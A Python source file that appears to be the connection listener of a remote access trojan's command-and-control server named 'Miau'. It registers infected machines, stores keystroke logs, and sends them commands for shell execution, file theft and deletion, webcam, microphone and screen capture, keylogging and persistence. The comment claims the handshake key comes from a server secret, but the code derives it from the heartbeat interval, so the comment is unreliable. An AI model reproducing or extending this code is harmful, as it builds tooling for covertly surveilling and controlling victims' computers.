"""Miau TCP+TLS listener: accepts agent connections, handles auth/heartbeat,
sends pending commands, stores responses. No REST here — that's api.py.
"""
from __future__ import annotations

import asyncio
import contextlib
import logging
import ssl
import time
import sys
from pathlib import Path
from dataclasses import dataclass

import enums_pb2 as en
import messages_pb2 as pb
import codec
from config import Config
from store import Store

log = logging.getLogger("miau.listener")

_FH = logging.FileHandler(str(Path(__file__).parent / "listener.log"), encoding="utf-8")
_FH.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))
log.addHandler(_FH)
log.setLevel(logging.DEBUG)
log.propagate = False


@dataclass
class AgentSession:
    token: str = ""
    install_id: str = ""
    aes_key: bytes = b""
    last_seen: float = 0.0
    writer: asyncio.StreamWriter | None = None
    hb_interval: int = 15
    state: str = "ONLINE"
    closed: bool = False


class Listener:
    def __init__(self, cfg: Config, store: Store):
        self.cfg = cfg
        self.store = store
        self.sessions: dict[str, AgentSession] = {}
        self._ssl_ctx: ssl.SSLContext | None = None

    # ---------- ssl ----------
    def _load_ssl(self) -> ssl.SSLContext:
        cert = f"{self.cfg.tls.cert_dir}/server.crt"
        key = f"{self.cfg.tls.cert_dir}/server.key"
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=cert, keyfile=key)
        return ctx

    # ---------- main loop ----------
    async def run(self) -> None:
        self._ssl_ctx = self._load_ssl()
        server = await asyncio.start_server(
            self._handle_conn,
            self.cfg.server.host,
            self.cfg.server.tcp_port,
            ssl=self._ssl_ctx,
            limit=codec.MAX_FRAME + 64,
        )
        log.info("TCP+TLS listener on %s:%s", self.cfg.server.host, self.cfg.server.tcp_port)
        async with server:
            await server.serve_forever()

    # ---------- per-connection ----------
    async def _handle_conn(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        session = AgentSession(writer=writer)
        try:
            while not session.closed:
                try:
                    key = session.aes_key if session.aes_key else self._psk()
                    env = await asyncio.wait_for(
                        codec.read_frame_async(reader, key),
                        timeout=self.cfg.server.hb_timeout + 30,
                    )
                except asyncio.TimeoutError:
                    break
                except (codec.FrameError, ConnectionError) as exc:
                    log.debug("conn error: %s", exc)
                    break
                await self._dispatch(session, env, reader, writer)
        except Exception:
            log.exception("handler crashed")
        finally:
            await self._cleanup(session)

    def _psk(self) -> bytes:
        # Pre-shared key used only for the unauthenticated auth handshake.
        # Derived from a server secret; agents know it via builder config.
        return self.cfg.server.hb_interval.to_bytes(32, "big")

    # ---------- dispatch ----------
    async def _dispatch(
        self,
        session: AgentSession,
        env: pb.Envelope,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        session.last_seen = time.time()
        ptype = env.packet_type
        if ptype == en.PACKET_AUTH:
            await self._on_auth(session, env, writer)
        elif ptype == en.PACKET_HEARTBEAT:
            await self._on_heartbeat(session, env)
        elif ptype == en.PACKET_RESPONSE:
            await self._on_response(session, env)
        elif ptype == en.PACKET_KEYLOG:
            await self._on_keylog(session, env)
        elif ptype == en.PACKET_EVENT:
            await self._on_event(session, env)
        else:
            log.debug("unhandled packet type %s from %s", ptype, session.token)

        # After any packet, push any queued commands back to the agent.
        if session.aes_key:
            await self._flush_commands(session, writer)

    # ---------- handlers ----------
    async def _on_auth(
        self, session: AgentSession, env: pb.Envelope, writer: asyncio.StreamWriter
    ) -> None:
        auth = pb.ClientAuth()
        auth.ParseFromString(env.payload)
        token = auth.token
        rec = self.store.get_token(token)
        if rec is None:
            log.warning("auth rejected: unknown token")
            await self._send(writer, session, self._auth_ack(False, "unknown token"))
            session.closed = True
            return

        session.token = token
        session.aes_key = bytes(rec["aes_key"])
        session.install_id = auth.install_id
        session.hb_interval = self.cfg.server.hb_interval

        self.store.touch_token(token)
        self.store.upsert_client(
            auth.install_id,
            token=token,
            hostname=auth.hostname,
            username=auth.username,
            os=auth.os,
            arch=auth.arch,
            client_ver=auth.client_ver,
            state="ONLINE",
            hb_interval=session.hb_interval,
        )
        self.sessions[auth.install_id] = session
        log.info("auth OK: %s (%s) ver=%s", token, auth.hostname, auth.client_ver)

        await self._send(writer, session, self._auth_ack(True, "ok"))
        await self._flush_commands(session, writer)

    async def _on_heartbeat(self, session: AgentSession, env: pb.Envelope) -> None:
        hb = pb.Heartbeat()
        hb.ParseFromString(env.payload)
        if not session.install_id:
            return
        self.store.upsert_client(
            session.install_id,
            state="ONLINE",
            last_seen=int(time.time()),
            pub_ip=hb.pub_ip or None,
            priv_ip=hb.priv_ip or None,
            metadata=None,
        )

    async def _on_response(self, session: AgentSession, env: pb.Envelope) -> None:
        resp = pb.Response()
        resp.ParseFromString(env.payload)
        # resp.id is the command id it answers.
        self.store.add_response(
            cmd_id=int(resp.id),
            status=en.ResponseStatus.Name(resp.status),
            message=resp.message,
            data=bytes(resp.data) if resp.data else None,
            final=int(resp.final),
        )

    async def _on_keylog(self, session: AgentSession, env: pb.Envelope) -> None:
        kl = pb.KeyLog()
        kl.ParseFromString(env.payload)
        self.store.add_keylog(session.token, kl.window, kl.text, int(kl.ts))

    async def _on_event(self, session: AgentSession, env: pb.Envelope) -> None:
        ev = pb.ClientEvent()
        ev.ParseFromString(env.payload)
        log.info("event %s: %s", ev.kind, ev.detail)

    # ---------- command push ----------
    # ---------- command push ----------
    _CMD_TYPE = {
        "shell": "CMD_SHELL_EXEC",
        "file_list": "CMD_FILE_LIST",
        "file_download": "CMD_FILE_DOWNLOAD",
        "file_upload": "CMD_FILE_UPLOAD",
        "file_delete": "CMD_FILE_DELETE",
        "process_list": "CMD_PROCESS_LIST",
        "process_kill": "CMD_PROCESS_KILL",
        "net_list": "CMD_NET_LIST",
        "screen_start": "CMD_SCREEN_START",
        "screen_stop": "CMD_SCREEN_STOP",
        "webcam_start": "CMD_WEBCAM_START",
        "webcam_stop": "CMD_WEBCAM_STOP",
        "mic_start": "CMD_MIC_START",
        "mic_stop": "CMD_MIC_STOP",
        "keylog_start": "CMD_KEYLOG_START",
        "keylog_stop": "CMD_KEYLOG_STOP",
        "persist_install": "CMD_PERSIST_INSTALL",
        "persist_remove": "CMD_PERSIST_REMOVE",
        "module_load": "CMD_MODULE_LOAD",
        "module_exec": "CMD_MODULE_EXEC",
        "module_restart": "CMD_MODULE_RESTART",
        "uninstall": "CMD_UNINSTALL",
        "ping": "CMD_PING",
        "sysinfo": "CMD_SYSINFO",
    }

    async def _flush_commands(
        self, session: AgentSession, writer: asyncio.StreamWriter
    ) -> None:
        for cmd in self.store.next_commands(session.token):
            ctype = cmd["cmd_type"]
            if ctype.isdigit():
                cval = int(ctype)
            else:
                enum_name = self._CMD_TYPE.get(ctype)
                if enum_name is None or enum_name not in en.CommandType.keys():
                    log.warning("unknown cmd type %r -> marking done", ctype)
                    self.store.add_response(
                        cmd["id"], "RESP_ERROR", f"unknown cmd type: {ctype}",
                        final=1,
                    )
                    continue
                cval = en.CommandType.Value(enum_name)
            env = pb.Envelope(
                version=1,
                token=session.token,
                seq=0,
                timestamp=int(time.time()),
                packet_type=en.PACKET_COMMAND,
                payload=pb.Command(
                    id=cmd["id"],
                    cmd_type=cval,
                    args=cmd["args"] or "",
                    blob=bytes(cmd["blob"]) if cmd["blob"] else b"",
                    timeout=0,
                ).SerializeToString(),
            )
            try:
                await self._send(writer, session, env)
            except Exception:
                log.exception("failed to push command")
                break

    # ---------- helpers ----------
    def _auth_ack(self, ok: bool, reason: str) -> pb.Envelope:
        return pb.Envelope(
            version=1,
            packet_type=en.PACKET_AUTH_ACK,
            timestamp=int(time.time()),
            payload=pb.AuthAck(
                accepted=ok,
                reason=reason,
                hb_interval=self.cfg.server.hb_interval,
            ).SerializeToString(),
        )

    async def _send(
        self,
        writer: asyncio.StreamWriter,
        session: AgentSession,
        env: pb.Envelope,
    ) -> None:
        frame = codec.encode_frame(session.aes_key or self._psk(), env)
        writer.write(frame)
        await writer.drain()

    async def _cleanup(self, session: AgentSession) -> None:
        session.closed = True
        if session.install_id:
            self.store.set_client_state(session.install_id, "OFFLINE")
            self.sessions.pop(session.install_id, None)
            log.info("agent offline: %s", session.install_id)
        with contextlib.suppress(Exception):
            await session.writer.wait_closed()
